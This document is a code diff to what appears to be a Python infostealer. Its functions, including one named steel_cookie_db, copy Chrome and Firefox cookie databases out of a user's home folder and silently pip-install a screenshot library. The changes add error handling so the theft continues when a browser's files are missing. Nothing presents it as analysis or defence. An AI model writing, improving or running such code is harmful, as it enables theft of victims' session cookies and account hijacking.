@@ -53,8 +53,10 @@ def screen_capture(platform):
     except:
         os.system(f'{executable} -m pip install pygrabshot >nul')
         time.sleep(5)
-    finally:
+    try:
         import pygrabshot
+    except Exception as Err:
+        print(f"pygrabshot import error: {Err}")
 
 
     def screen():
@@ -84,10 +86,16 @@ def steel_cookie_db(platform, username):
 
         # "Chrome" /home/[Your User Name]/.config/google-chrome/Default/Cookies
         src_file = f"/home/{username}/.config/google-chrome/Default/Cookies"
-        shutil.copy2(src_file, CACHE_PATH)
+        try:
+            shutil.copy2(src_file, CACHE_PATH)
+        except:
+            print("Warning: Chrome Cookie DB not found.")
         # "Firefox" /home/[Your User Name]/.mozilla/firefox/[Profile Name]/cookies.sqlite
         src_file = f"/home/{username}/.mozilla/firefox/[Profile Name]/cookies.sqlite"
-        shutil.copy2(src_file, CACHE_PATH)
+        try:
+            shutil.copy2(src_file, CACHE_PATH)
+        except:
+            print("Warning: Mozilla Cookie DB not found")
 
     if platform == "Darwin":
         # "Chrome" /Users/[Your User Name]/Library/Application Support/Google/Chrome/Default/Cookies
